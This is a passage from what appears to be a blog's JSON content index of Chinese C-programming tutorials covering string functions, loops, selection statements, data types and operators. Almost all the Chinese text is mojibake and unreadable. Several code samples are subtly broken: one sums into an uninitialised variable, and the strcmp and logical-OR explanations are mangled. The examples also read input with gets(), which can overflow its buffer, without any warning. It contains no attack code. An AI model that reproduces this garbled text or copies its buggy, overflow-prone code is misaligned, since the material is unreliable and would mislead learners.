ä¸ºåœ¨Cè¯­è¨€ä¸­æ•°ç»„åä»£è¡¨è¯¥æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ çš„åœ°å€(æˆ–è€…è¯´æ•°ç»„çš„èµ·å§‹åœ°å€) ä¸‹é¢çš„å†™æ³•æ˜¯ä¸æ­£ç¡®çš„: scanf(&quot;%s&quot;,&amp;str); //strå‰é¢ä¸åº”åŠ &amp; å®é™…ä¸Šæ˜¯è¿™æ ·æ‰§è¡Œçš„: æŒ‰å­—ç¬¦æ•°ç»„åcæ‰¾åˆ°å…¶æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ çš„åœ°å€,ç„¶åé€ä¸ªè¾“å‡ºå…¶ä¸­çš„å­—ç¬¦,ç›´åˆ°é‡â€™\\0â€™ä¸ºæ­¢. ä½¿ç”¨å­—ç¬¦ä¸²å¤„ç†å‡½æ•°putså‡½æ•°â€”â€”â€”è¾“å‡ºå­—ç¬¦ä¸²çš„å‡½æ•° puts (å­—ç¬¦æ•°ç»„) å…¶ä½œç”¨æ˜¯å°†ä¸€ä¸ªå­—ç¬¦ä¸²(ä»¥â€™\\0â€™ç»“æŸçš„å­—ç¬¦åºåˆ—)è¾“å‡ºåˆ°ç»ˆç«¯. åœ¨ç”¨putsè¾“å‡ºæ—¶çš„å­—ç¬¦ä¸²ç»“æŸæ ‡å¿—â€™\\0â€™æ¢æˆâ€™\\nâ€™,å³è¾“å‡ºå®Œå­—ç¬¦ä¸²åæ¢è¡Œ. getså‡½æ•°â€”â€”â€”è¾“å…¥å­—ç¬¦ä¸²çš„å‡½æ•° gets (å­—ç¬¦æ•°ç»„) å…¶ä½œç”¨æ˜¯ä»ç»ˆç«¯è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²åˆ°å­—ç¬¦æ•°ç»„,å¹¶ä¸”å¾—åˆ°ä¸€ä¸ªå‡½æ•°å€¼.è¯¥å‡½æ•°å€¼æ˜¯å­—ç¬¦æ•°ç»„çš„èµ·å§‹åœ°å€. å°†è¾“å…¥çš„å­—ç¬¦ä¸²é€ç»™å­—ç¬¦æ•°ç»„(å­—ç¬¦æ•°ç»„å¾—åˆ°çš„æ˜¯è¾“å…¥çš„å­—ç¬¦ä¸²+â€™\\0â€™),è¿”å›çš„å‡½æ•°å€¼æ˜¯å­—ç¬¦æ•°ç»„strçš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„åœ°å€. strcatå‡½æ•°â€”â€”â€”å­—ç¬¦ä¸²è¿æ¥å‡½æ•° strcat(å­—ç¬¦æ•°ç»„1,å­—ç¬¦æ•°ç»„2) å…¶ä½œç”¨æ˜¯æŠŠä¸¤ä¸ªå­—ç¬¦æ•°ç»„çš„å­—ç¬¦ä¸²è¿æ¥èµ·æ¥,æŠŠå­—ç¬¦ä¸²2è¿æ¥åˆ°å­—ç¬¦ä¸²1åé¢,ç»“æœæ”¾åœ¨å­—ç¬¦æ•°ç»„1ä¸­.å‡½æ•°è°ƒç”¨å¾—åˆ°å‡½æ•°å€¼æ˜¯å­—ç¬¦æ•°ç»„1çš„åœ°å€. 1.å­—ç¬¦æ•°ç»„1å¿…é¡»è¶³å¤Ÿå¤§ 2.è¿æ¥å‰ä¸¤ä¸ªå­—ç¬¦ä¸²åé¢éƒ½æœ‰â€™\\0â€™,è¿æ¥æ—¶å°†å­—ç¬¦ä¸²1åé¢çš„â€™\\0â€™å–æ¶ˆ,åªåœ¨æ–°å­—ç¬¦ä¸²åé¢ä¿ç•™. strcpyå’Œstrncpyå‡½æ•°â€”â€”â€”å­—ç¬¦ä¸²å¤åˆ¶å‡½æ•° strcpy(å­—ç¬¦æ•°ç»„1,å­—ç¬¦ä¸²2) ä½œç”¨æ˜¯å°†å­—ç¬¦ä¸²2å¤åˆ¶åˆ°å­—ç¬¦ä¸²1ä¸­å». â€œå­—ç¬¦æ•°ç»„1â€å¿…é¡»å†™æˆæ•°ç»„åå½¢å¼,â€å­—ç¬¦ä¸²2â€å¯ä»¥æ˜¯å­—ç¬¦æ•°ç»„å,ä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²å¸¸é‡ å¦‚æœåœ¨å¤åˆ¶å‰æœªå¯¹str1æ•°ç»„åˆå§‹åŒ–æˆ–èµ‹å€¼,åˆ™str1çš„å„å­—èŠ‚çš„å†…å®¹æ˜¯æ— æ³•é¢„çŸ¥çš„. ä¸èƒ½ä½¿ç”¨èµ‹å€¼è¯­å¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²å¸¸é‡æˆ–å­—ç¬¦æ•°ç»„ç›´æ¥ç»™ä¸€ä¸ªå­—ç¬¦æ•°ç»„,å­—ç¬¦æ•°ç»„æ˜¯ä¸€ä¸ªåœ°å€å¸¸é‡,å®ƒä¸èƒ½æ”¹å˜å€¼. å¯ä»¥ç”¨strncpyå‡½æ•°å°†å­—ç¬¦ä¸²2ä¸­å‰é¢nä¸ªå­—ç¬¦å¤åˆ¶åˆ°å­—ç¬¦æ•°ç»„1ä¸­å». strncpy(str1,str2,2); strcmpå‡½æ•°â€”â€”å­—ç¬¦ä¸²æ¯”è¾ƒå‡½æ•° strcmp(å­—ç¬¦ä¸²1,å­—ç¬¦ä¸²2) å°†ä¸¤ä¸ªå­—ç¬¦ä¸²è‡ªå·¦è‡³å³é€ä¸ªå­—ç¬¦ç›¸æ¯”(æŒ‰ASCIIç å€¼å¤§å°æ¯”è¾ƒ),ç›´è‡³å‡ºç°ä¸åŒçš„å­—ç¬¦æˆ–é‡åˆ°â€™\\0â€™ä¸ºæ­¢. 1)è‹¥å…¨éƒ¨å­—ç¬¦ç›¸åŒ,åˆ™è®¤ä¸ºä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸åŒ 2)è‹¥å‡ºç°ä¸ç›¸åŒçš„å­—ç¬¦,åˆ™ä»¥ç¬¬1å¯¹ä¸ç›¸åŒçš„å­—ç¬¦çš„æ¯”è¾ƒç»“æœä¸ºå‡†. å¦‚æœ s1 å’Œ s2 æ˜¯ç›¸åŒçš„ï¼Œåˆ™è¿”å› 0ï¼›å¦‚æœ s1s2 åˆ™è¿”å›å¤§äº 0ã€‚ strlenå‡½æ•°â€”â€”â€”æµ‹å­—ç¬¦ä¸²é•¿åº¦çš„å‡½æ•° strlen(å­—ç¬¦æ•°ç»„) char c[10] = {&quot;China&quot;}; printf(&quot;%d&quot;, strlen(c)); //ç»“æœæ˜¯5 strlwrå‡½æ•°â€”â€”â€”è½¬æ¢ä¸ºå°å†™çš„å‡½æ•° strlwr(å­—ç¬¦ä¸²) struprå‡½æ•°â€”â€”â€”è½¬æ¢ä¸ºå¤§å†™çš„å‡½æ•° strupr(å­—ç¬¦ä¸²) è¾“å…¥ä¸€è¡Œå­—ç¬¦ç»Ÿè®¡å…¶ä¸­æœ‰å¤šå°‘ä¸ªå•è¯,å•è¯é—´ç”¨ç©ºæ ¼åˆ†éš”å¼€#include&lt;stdio.h&gt; int main() { char string[81]; int i, num = 0, word = 0; char c; gets(string); for (i = 0; (c = string[i]) != &#39;\\0&#39;; i++) if (c == &#39; &#39;)word = 0; else if (word == 0) { word = 1; num++; } printf(&quot;There are %d words in the lines.\\n&quot;, num); return 0; } æœ‰3ä¸ªå­—ç¬¦ä¸²è¦æ±‚æ‰¾åˆ°å…¶ä¸­â€œæœ€å¤§â€è€…#include&lt;stdio.h&gt; #include&lt;string.h&gt; int main() { char str[3][20];//å®šä¹‰äºŒç»´æ•°ç»„ char string[20];//å®šä¹‰ä¸€ç»´æ•°ç»„ï¼Œä½œä¸ºäº¤æ¢å­—ç¬¦ä¸²æ—¶çš„ä¸´æ—¶å­—ç¬¦æ•°ç»„ int i; for (i = 0; i &lt; 3; i++) gets(str[i]);//è¯»å…¥3ä¸ªå­—ç¬¦ä¸² if (strcmp(str[0], str[1]) &gt; 0) strcpy(string, str[0]); else strcpy(string, str[1]); if (strcmp(str[2], string) &gt; 0) strcpy(string, str[2]); printf(&quot;\\nthe largest string is:\\n%s\\n&quot;, string); return 0; }","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://blog.kayleh.top/tags/C/"}]},{"title":"cycle structure programming","slug":"cycle-structure-programming","date":"2020-10-25T09:16:57.000Z","updated":"2021-04-11T17:11:28.490Z","comments":true,"path":"cycle-structure-programming/","link":"","permalink":"https://blog.kayleh.top/cycle-structure-programming/","excerpt":"","text":"å¾ªç¯ç»“æ„ä½“ç¨‹åºè®¾è®¡ç”¨whileè¯­å¥å®ç°å¾ªç¯ while (è¡¨è¾¾å¼) è¯­å¥ æ±‚1+2+3+â€¦.+100;#include&lt;stdio.h&gt; int main() { int i = 1; int sum = 0; while (i &lt;= 100) { sum += i; i++; } printf(&quot;%d&quot;, sum); return 0; } ç”¨doâ€¦whileè¯­å¥å®ç°å¾ªç¯ do â€‹ è¯­å¥ while (è¡¨è¾¾å¼); å¦‚: #include&lt;stdio.h&gt; int main() { int i = 1; do { printf(&quot;%d\\n&quot;, i++); } while (i &lt;= 100); return 0; } æ±‚1+2+3+â€¦.+100;#include&lt;stdio.h&gt; int main() { int i = 1,sum = 0; do { sum += i; i++; } while (i &lt;= 100); printf(&quot;%d&quot;, sum); return 0; } whileå’Œdoâ€¦whileçš„åŒºåˆ«doâ€¦whileæ— è®ºå¦‚ä½•éƒ½ä¼šè‡³å°‘æ‰§è¡Œä¸€æ¬¡å¾ªç¯ä½“ whileåªè¦ä¸æ»¡è¶³å°±ä¸ä¼šæ‰§è¡Œå¾ªç¯ä½“ ç”¨forè¯­å¥å®ç°å¾ªç¯ for(å¾ªç¯å˜é‡èµ‹åˆå€¼;å¾ªç¯æ¡ä»¶;å¾ªç¯å˜é‡å¢å€¼) â€‹ è¯­å¥ å¦‚: for(i=1;i&lt;=100;i++) â€‹ sum+=i; å¾ªç¯çš„åµŒå¥—æ”¹å˜å¾ªç¯çš„æ‰§è¡ŒçŠ¶æ€ç”¨breakè¯­å¥æå‰ç»ˆæ­¢å¾ªç¯åœ¨å…¨ç³»1000åå­¦ç”Ÿä¸­ä¸¾è¡Œæ…ˆå–„å‹Ÿæ,å½“æ€»æ•°è¾¾åˆ°10ä¸‡æ—¶å°±ç»“æŸ,ç»Ÿè®¡æ­¤æ—¶ææ¬¾çš„äººæ•°ä»¥åŠå¹³å‡æ¯äººææ¬¾çš„æ•°ç›®. #include&lt;stdio.h&gt; #define SUM 100000 int main() { float amount, aver, total; int i; for (i = 1; i &lt; 1000; i++) { printf(&quot;please enter amount:&quot;); scanf(&quot;%f&quot;, &amp;amount); total += amount; if (total &gt;= SUM)break; } aver = total / i; printf(&quot;num=%d\\naver=%10.2f\\n&quot;, i, aver); return 0; } breakçš„ä½œç”¨å°±æ˜¯ä½¿æµç¨‹è·³åˆ°å¾ªç¯ä½“ä¹‹å¤–,æ¥ç€æ‰§è¡Œå¾ªç¯ä½“ä¸‹é¢çš„è¯­å¥. ç”¨continueè¯­å¥æå‰ç»“æŸæœ¬æ¬¡å¾ªç¯æœ‰æ—¶ä¸å¸Œæœ›ç»ˆæ­¢æ•´ä¸ªå¾ªç¯çš„æ“ä½œ,è€Œåªå¸Œæœ›æå‰ç»“æŸæœ¬æ¬¡å¾ªç¯,è€Œæ¥ç€æ‰§è¡Œä¸‹æ¬¡å¾ªç¯.è¿™æ—¶å¯ä»¥ç”¨continueè¯­å¥ è¦æ±‚è¾“å‡º100~200çš„ä¸èƒ½è¢«3æ•´é™¤çš„æ•° #include&lt;stdio.h&gt; int main() { int n; for (n = 100; n &lt;= 200; n++) { if (n % 3 == 0) continue; printf(&quot;%d\\t&quot;, n); } printf(&quot;\\n&quot;); return 0; }","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://blog.kayleh.top/tags/C/"}]},{"title":"select structure programming","slug":"select-structure-programming","date":"2020-10-25T09:16:20.000Z","updated":"2021-04-11T17:11:28.521Z","comments":true,"path":"select-structure-programming/","link":"","permalink":"https://blog.kayleh.top/select-structure-programming/","excerpt":"","text":"é€‰æ‹©ç»“æ„ç¨‹åºè®¾è®¡é€‰æ‹©ç»“æ„å’Œæ¡ä»¶åˆ¤æ–­ç”¨ifè¯­å¥å®ç°é€‰æ‹©ç»“æ„ if å…³ç³»è¿ç®—ç¬¦å’Œå…³ç³»è¡¨è¾¾å¼ å…³ç³»è¿ç®—ç¬¦ æè¿° å®ä¾‹ == æ£€æŸ¥ä¸¤ä¸ªæ“ä½œæ•°çš„å€¼æ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœç›¸ç­‰åˆ™æ¡ä»¶ä¸ºçœŸã€‚ (A == B) ä¸ºå‡ã€‚ != æ£€æŸ¥ä¸¤ä¸ªæ“ä½œæ•°çš„å€¼æ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœä¸ç›¸ç­‰åˆ™æ¡ä»¶ä¸ºçœŸã€‚ (A != B) ä¸ºçœŸã€‚ &gt; æ£€æŸ¥å·¦æ“ä½œæ•°çš„å€¼æ˜¯å¦å¤§äºå³æ“ä½œæ•°çš„å€¼ï¼Œå¦‚æœæ˜¯åˆ™æ¡ä»¶ä¸ºçœŸã€‚ (A &gt; B) ä¸ºå‡ã€‚ &lt; æ£€æŸ¥å·¦æ“ä½œæ•°çš„å€¼æ˜¯å¦å°äºå³æ“ä½œæ•°çš„å€¼ï¼Œå¦‚æœæ˜¯åˆ™æ¡ä»¶ä¸ºçœŸã€‚ (A &lt; B) ä¸ºçœŸã€‚ &gt;= æ£€æŸ¥å·¦æ“ä½œæ•°çš„å€¼æ˜¯å¦å¤§äºæˆ–ç­‰äºå³æ“ä½œæ•°çš„å€¼ï¼Œå¦‚æœæ˜¯åˆ™æ¡ä»¶ä¸ºçœŸã€‚ (A &gt;= B) ä¸ºå‡ã€‚ &lt;= æ£€æŸ¥å·¦æ“ä½œæ•°çš„å€¼æ˜¯å¦å°äºæˆ–ç­‰äºå³æ“ä½œæ•°çš„å€¼ï¼Œå¦‚æœæ˜¯åˆ™æ¡ä»¶ä¸ºçœŸã€‚ (A &lt;= B) ä¸ºçœŸã€‚ è¾“å…¥ä¸¤ä¸ªå®æ•°,æŒ‰ç”±å°åˆ°å¤§çš„é¡ºåºè¾“å‡ºè¿™ä¸¤ä¸ªæ•°#include&lt;stdio.h&gt; int main() { float a, b, t; scanf(&quot;%f,%f&quot;, &amp;a, &amp;b); if (a &gt; b) { //å°†aå’Œbçš„å€¼äº’æ¢ t = a; a = b; b = t; } printf(&quot;%5.2f,%5.2f\\n&quot;, a, b); return 0; } è¾“å…¥3ä¸ªæ•°å•Ša,b,c,è¦æ±‚æŒ‰ç”±å°åˆ°å¤§çš„é¡ºåºè¾“å‡º.ifè¯­å¥çš„ä¸€èˆ¬å½¢å¼ if(è¡¨è¾¾å¼) è¯­å¥1 â€‹ [else è¯­å¥2] â€¦â€¦.. é€»è¾‘è¿ç®—ç¬¦å’Œé€»è¾‘è¡¨è¾¾å¼ é€»è¾‘è¿ç®—ç¬¦ æè¿° å®ä¾‹ &amp;&amp; ç§°ä¸ºé€»è¾‘ä¸è¿ç®—ç¬¦ã€‚å¦‚æœä¸¤ä¸ªæ“ä½œæ•°éƒ½éé›¶ï¼Œåˆ™æ¡ä»¶ä¸ºçœŸã€‚ (A &amp;&amp; B) ä¸ºå‡ã€‚ \\ \\ ç§°ä¸ºé€»è¾‘æˆ–è¿ç®—ç¬¦ã€‚å¦‚æœä¸¤ä¸ªæ“ä½œæ•°ä¸­æœ‰ä»»æ„ä¸€ä¸ªéé›¶ï¼Œåˆ™æ¡ä»¶ä¸ºçœŸã€‚ (A \\ \\ B) ä¸ºçœŸã€‚ ! ç§°ä¸ºé€»è¾‘éè¿ç®—ç¬¦ã€‚ç”¨æ¥é€†è½¬æ“ä½œæ•°çš„é€»è¾‘çŠ¶æ€ã€‚å¦‚æœæ¡ä»¶ä¸ºçœŸåˆ™é€»è¾‘éè¿ç®—ç¬¦å°†ä½¿å…¶ä¸ºå‡ã€‚ !(A &amp;&amp; B) ä¸ºçœŸã€‚ é€‰æ‹©ç»“æ„çš„åµŒå¥—ç”¨switchè¯­å¥å®ç°å¤šåˆ†æ”¯é€‰æ‹©ç»“æ„è¦æ±‚æŒ‰ç…§è€ƒè¯•æˆç»©ç­‰çº§è¾“å‡ºç™¾åˆ†åˆ¶åˆ†æ•°åˆ¶,Aç­‰ä¸º85åˆ†ä»¥ä¸Š,Bç­‰ä¸º70~84åˆ†,Cç­‰ä¸º60~69åˆ†,Dç­‰ä¸º60åˆ†ä»¥ä¸‹.æˆç»©çš„ç­‰çº§ç”±é”®ç›˜è¾“å…¥. #include&lt;stdio.h&gt; int main() { char grade; scanf(&quot;%c&quot;, &amp;grade); printf(&quot;Yours Score:&quot;); switch (grade) { case &#39;A&#39;: printf(&quot;85~100&quot;); break; case &#39;B&#39;: printf(&quot;70~84&quot;); break; case &#39;C&#39;: printf(&quot;60~69&quot;); break; case &#39;D&#39;: printf(&quot;&lt;60&quot;); break; default: printf(&quot;enter data error!&quot;); } return 0; }","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://blog.kayleh.top/tags/C/"}]},{"title":"sequential programming","slug":"sequential-programming","date":"2020-10-25T09:16:00.000Z","updated":"2021-04-11T17:11:28.524Z","comments":true,"path":"sequential-programming/","link":"","permalink":"https://blog.kayleh.top/sequential-programming/","excerpt":"","text":"é¡ºåºç¨‹åºè®¾è®¡æ±‚æ‘„æ°åº¦ #include&lt;stdio.h&gt; int main() { float f, c; f = 64.0; c = (5.0 / 9) * (f - 32); printf(&quot;f=%f\\nc=%f\\n&quot;, f, c); return 0; } å¸¸é‡ æ•´å‹å¸¸é‡ å®æ€§å¸¸é‡(æœ‰å°æ•°ç‚¹) åè¿›åˆ¶å°æ•°å½¢å¼ æŒ‡æ•°å½¢å¼:å¦‚12.34e3(eæˆ–Eä¹‹å‰å¿…é¡»æœ‰æ•°å­—,eæˆ–Eä¹‹åå¿…é¡»ä¸ºæ•´æ•°) å­—ç¬¦å¸¸é‡ æ™®é€šå­—ç¬¦,ç”¨å•æ’‡å·æ‹¬èµ·æ¥çš„ä¸€ä¸ªå­—ç¬¦ å­—ç¬¦å¸¸é‡å­˜å‚¨åœ¨è®¡ç®—æœºå­˜å‚¨å•å…ƒä¸­æ—¶,å¹¶ä¸æ˜¯å­˜å‚¨å­—ç¬¦æœ¬èº«,è€Œæ˜¯ä»¥å…¶ä»£ç (ä¸€èˆ¬é‡‡ç”¨ASCIIç )å­˜å‚¨çš„ è½¬ä¹‰å­—ç¬¦ å­—ç¬¦ä¸²å¸¸é‡ ç”¨åŒæ’‡å·æ‹¬èµ·æ¥çš„å…¨éƒ¨å­—ç¬¦,åŒæ’‡å·å†…å¯ä»¥åªæœ‰ä¸€ä¸ªå­—ç¬¦ ç¬¦å·å¸¸é‡ ç”¨#defineæŒ‡ä»¤,æŒ‡å®šç”¨ä¸€ä¸ªç¬¦å·åç§°ä»£è¡¨ä¸€ä¸ªå¸¸é‡ åœ¨é¢„ç¼–è¯‘å,ç¬¦å·å˜é‡ä¼šå…¨éƒ¨è¢«ç½®æ¢, #define PI 3.1415 //æ³¨æ„è¡Œæœ«æ²¡æœ‰åˆ†å· å˜é‡å˜é‡ä»£è¡¨ä¸€ä¸ªæœ‰åå­—,å…·æœ‰ç‰¹å®šå±æ€§çš„ä¸€ä¸ªå­˜å‚¨å•å…ƒ,å®ƒç”¨æ¥å­˜æ”¾æ•°æ®,åœ¨ç¨‹åºè¿è¡ŒæœŸé—´,å˜é‡çš„å€¼æ—¶å¯ä»¥æ”¹å˜çš„. å˜é‡å¿…é¡»å…ˆå®šä¹‰,åä½¿ç”¨. åœ¨å®šä¹‰æ—¶æŒ‡å®šè¯¥å˜é‡çš„åå­—å’Œç±»å‹. ä»å˜é‡ä¸­å–å€¼,å®é™…ä¸Šæ—¶é€šè¿‡å˜é‡åæ‰¾åˆ°ç›¸åº”çš„å†…å­˜åœ°å€,ä»è¯¥å­˜å‚¨å•å…ƒä¸­è¯»å–æ•°æ®. å¸¸å˜é‡åœ¨å®šä¹‰å˜é‡æ—¶,å‰é¢åŠ ä¸€ä¸ªå…³é”®å­—const å¸¸å˜é‡ä¸å¤„ç†çš„å¼‚åŒ? æœ‰ç±»å‹,å å­˜å‚¨å•å…ƒ,ä¸å…è®¸æ”¹å˜å…¶å€¼ å¸¸å˜é‡æ—¶æœ‰åå­—çš„ä¸å˜é‡(ä¾¿äºåœ¨ç¨‹åºä¸­è¢«å¼•ç”¨),è€Œå¸¸é‡æ—¶æ²¡æœ‰åå­—çš„ä¸å˜é‡ æ ‡è¯†ç¬¦ä¸€ä¸ªå¯¹è±¡çš„åå­— æ•°æ®ç±»å‹ åŸºæœ¬ç±»å‹ æ•´å‹ç±»å‹ åŸºæœ¬æ•´å‹(int) çŸ­æ•´å‹(short int) é•¿æ•´å‹(long int) åŒé•¿æ•´å‹(long long int) å­—ç¬¦å‹(char) å¸ƒå°”å‹(bool) æµ®ç‚¹ç±»å‹ å•ç²¾åº¦æµ®ç‚¹å‹(float) åŒç²¾åº¦æµ®ç‚¹å‹(double) å¤æ•°æµ®ç‚¹å‹(float_complex,double_complex,long long_complex) æšä¸¾ç±»å‹(enum) ç©ºç±»å‹(void) æ´¾ç”Ÿç±»å‹ æŒ‡é’ˆç±»å‹(*) æ•°ç»„ç±»å‹([ ]) ç»“æ„ä½“ç±»å‹(struct) å…±ç”¨ä½“ç±»å‹(union) å‡½æ•°ç±»å‹ æ•´å‹æ•°æ®æ•´æ•°æ•°æ®å­˜å‚¨ç©ºé—´å’Œå€¼çš„èŒƒå›´ ç±»å‹ å­—èŠ‚æ•° å–å€¼èŒƒå›´ int 2 - 32768 ~ 32767 ï¼ˆ5ä½åè¿›åˆ¶æ•°ï¼‰ int 4 - 2147483648 ~ 2147483647 ï¼ˆ10ä½åè¿›åˆ¶æ•°ï¼‰ unsignde int 2 0 ~ 65535 ï¼ˆ5ä½åè¿›åˆ¶æ•°ï¼‰ unsignde int 4 0 ~ 4294967295 ï¼ˆ10ä½åè¿›åˆ¶æ•°ï¼‰ short 2 - 32768 ~ 32767 ï¼ˆ5ä½åè¿›åˆ¶æ•°ï¼‰ unsigned short 2 0 ~ 65535 ï¼ˆ5ä½åè¿›åˆ¶æ•°ï¼‰ long 4 - 2147483648 ~ 2147483647 ï¼ˆ10ä½åè¿›åˆ¶æ•°ï¼‰ usigned long 4 0 ~ 4294967295 ï¼ˆ10ä½åè¿›åˆ¶æ•°ï¼‰ long long 8 - 9223372036854775808 ~ 9223372036854775807ï¼ˆ20ä½åè¿›åˆ¶æ•°ï¼‰ unsigned long long 8 0 ~ 18446744073709551615 ï¼ˆ20ä½åè¿›åˆ¶æ•°ï¼‰ å­—ç¬¦å‹æ•°æ®æµ®ç‚¹å‹æ•°æ® cç¼–è¯‘ç³»ç»ŸæŠŠæµ®ç‚¹å‹å¸¸é‡éƒ½æŒ‰åŒç²¾åº¦å¤„ç†,åˆ†é…8ä¸ªå­—èŠ‚ float a = 3.14159f; //æŠŠæ­¤3.14159æŒ‰å•ç²¾åº¦æµ®ç‚¹å¸¸é‡å¤„ç†,ç¼–è¯‘æ—¶ä¸å‡ºç°&quot;è­¦å‘Š&quot; long double a = 1.23L; //æŠŠæ­¤,1.23ä½œä¸ºlong doubleå‹å¤„ç† è¿ç®—ç¬¦å’Œè¡¨è¾¾å¼ ç®—æœ¯è¿ç®—ç¬¦ æè¿° å®ä¾‹ + æŠŠä¸¤ä¸ªæ“ä½œæ•°ç›¸åŠ  A + B å°†å¾—åˆ° 30 - ä»ç¬¬ä¸€ä¸ªæ“ä½œæ•°ä¸­å‡å»ç¬¬äºŒä¸ªæ“ä½œæ•° A - B å°†å¾—åˆ° -10 * æŠŠä¸¤ä¸ªæ“ä½œæ•°ç›¸ä¹˜ A * B å°†å¾—åˆ° 200 / åˆ†å­é™¤ä»¥åˆ†æ¯ B / A å°†å¾—åˆ° 2 % å–æ¨¡è¿ç®—ç¬¦ï¼Œæ•´é™¤åçš„ä½™æ•° B % A å°†å¾—åˆ° 0 ++ è‡ªå¢è¿ç®—ç¬¦ï¼Œæ•´æ•°å€¼å¢åŠ  1 A++ å°†å¾—åˆ° 11 â€” è‡ªå‡è¿ç®—ç¬¦ï¼Œæ•´æ•°å€¼å‡å°‘ 1 Aâ€” å°†å¾—åˆ° 9 å…³ç³»è¿ç®—ç¬¦ æè¿° å®ä¾‹ == æ£€æŸ¥ä¸¤ä¸ªæ“ä½œæ•°çš„å€¼æ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœç›¸ç­‰åˆ™æ¡ä»¶ä¸ºçœŸã€‚ (A == B) ä¸ºå‡ã€‚ != æ£€æŸ¥ä¸¤ä¸ªæ“ä½œæ•°çš„å€¼æ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœä¸ç›¸ç­‰åˆ™æ¡ä»¶ä¸ºçœŸã€‚ (A != B) ä¸ºçœŸã€‚ &gt; æ£€æŸ¥å·¦æ“ä½œæ•°çš„å€¼æ˜¯å¦å¤§äºå³æ“ä½œæ•°çš„å€¼ï¼Œå¦‚æœæ˜¯åˆ™æ¡ä»¶ä¸ºçœŸã€‚ (A &gt; B) ä¸ºå‡ã€‚ &lt; æ£€æŸ¥å·¦æ“ä½œæ•°çš„å€¼æ˜¯å¦å°äºå³æ“ä½œæ•°çš„å€¼ï¼Œå¦‚æœæ˜¯åˆ™æ¡ä»¶ä¸ºçœŸã€‚ (A &lt; B) ä¸ºçœŸã€‚ &gt;= æ£€æŸ¥å·¦æ“ä½œæ•°çš„å€¼æ˜¯å¦å¤§äºæˆ–ç­‰äºå³æ“ä½œæ•°çš„å€¼ï¼Œå¦‚æœæ˜¯åˆ™æ¡ä»¶ä¸ºçœŸã€‚ (A &gt;= B) ä¸ºå‡ã€‚ &lt;= æ£€æŸ¥å·¦æ“ä½œæ•°çš„å€¼æ˜¯å¦å°äºæˆ–ç­‰äºå³æ“ä½œæ•°çš„å€¼ï¼Œå¦‚æœæ˜¯åˆ™æ¡ä»¶ä¸ºçœŸã€‚ (A &lt;= B) ä¸ºçœŸã€‚ é€»è¾‘è¿ç®—ç¬¦ æè¿° å®ä¾‹ &amp;&amp; ç§°ä¸ºé€»è¾‘ä¸è¿ç®—ç¬¦ã€‚å¦‚æœä¸¤ä¸ªæ“ä½œæ•°éƒ½éé›¶ï¼Œåˆ™æ¡ä»¶ä¸ºçœŸã€‚ (A &amp;&amp; B) ä¸ºå‡ã€‚ \\ \\ ç§°ä¸ºé€»è¾‘æˆ–è¿ç®—ç¬¦ã€‚å¦‚æœä¸¤ä¸ªæ“ä½œæ•°ä¸­æœ‰ä»»æ„ä¸€ä¸ªéé›¶ï¼Œåˆ™æ¡ä»¶ä¸ºçœŸã€‚ (A \\ \\ B) ä¸ºçœŸã€‚ ! ç§°ä¸ºé€»è¾‘éè¿ç®—ç¬¦ã€‚ç”¨æ¥é€†è½¬æ“ä½œæ•°çš„é€»è¾‘çŠ¶æ€ã€‚å¦‚æœæ¡ä»¶ä¸ºçœŸåˆ™é€»è¾‘éè¿ç®—ç¬¦å°†ä½¿å…¶ä¸ºå‡ã€‚ !(A &amp;&amp; B) ä¸ºçœŸã€‚ ä½è¿ç®—ç¬¦ ä½è¿ç®—ç¬¦ä½œç”¨äºä½ï¼Œå¹¶é€ä½æ‰§è¡Œæ“ä½œã€‚&amp;ã€ | å’Œ ^ çš„çœŸå€¼è¡¨å¦‚ä¸‹æ‰€ç¤ºï¼š p q p &amp; q p \\ q p ^ q 0 0 0 0 0 0 1 0 1 1 1 1 1 1 0 1 0 0 1 1 ä½è¿ç®—ç¬¦ æè¿° å®ä¾‹ &amp; æŒ‰ä½ä¸æ“ä½œï¼ŒæŒ‰äºŒè¿›åˆ¶ä½è¿›è¡Œâ€ä¸â€è¿ç®—ã€‚è¿ç®—è§„åˆ™ï¼š0&amp;0=0; 0&amp;1=0; 1&amp;0=0; 1&amp;1=1; (A &amp; B) å°†å¾—åˆ° 12ï¼Œå³ä¸º 0000 1100 \\ æŒ‰ä½æˆ–è¿ç®—ç¬¦ï¼ŒæŒ‰äºŒè¿›åˆ¶ä½è¿›è¡Œâ€æˆ–â€è¿ç®—ã€‚è¿ç®—è§„åˆ™ï¼š`0 0=0; 0 1=1; 1 0=1; 1 1=1;` (A \\ B) å°†å¾—åˆ° 61ï¼Œå³ä¸º 0011 1101 ^ å¼‚æˆ–è¿ç®—ç¬¦ï¼ŒæŒ‰äºŒè¿›åˆ¶ä½è¿›è¡Œâ€å¼‚æˆ–â€è¿ç®—ã€‚è¿ç®—è§„åˆ™ï¼š0^0=0; 0^1=1; 1^0=1; 1^1=0; (A ^ B) å°†å¾—åˆ° 49ï¼Œå³ä¸º 0011 0001 ~ å–åè¿ç®—ç¬¦ï¼ŒæŒ‰äºŒè¿›åˆ¶ä½è¿›è¡Œâ€å–åâ€è¿ç®—ã€‚è¿ç®—è§„åˆ™ï¼š~1=0; ~0=1; (~A ) å°†å¾—åˆ° -61ï¼Œå³ä¸º 1100 0011ï¼Œä¸€ä¸ªæœ‰ç¬¦å·äºŒè¿›åˆ¶æ•°çš„è¡¥ç å½¢å¼ã€‚ &lt;&lt; äºŒè¿›åˆ¶å·¦ç§»è¿ç®—ç¬¦ã€‚å°†ä¸€ä¸ªè¿ç®—å¯¹è±¡çš„å„äºŒè¿›åˆ¶ä½å…¨éƒ¨å·¦ç§»è‹¥å¹²ä½ï¼ˆå·¦è¾¹çš„äºŒè¿›åˆ¶ä½ä¸¢å¼ƒï¼Œå³è¾¹è¡¥0ï¼‰ã€‚ A &lt;&lt; 2 å°†å¾—åˆ° 240ï¼Œå³ä¸º 1111 0000 &gt;&gt; 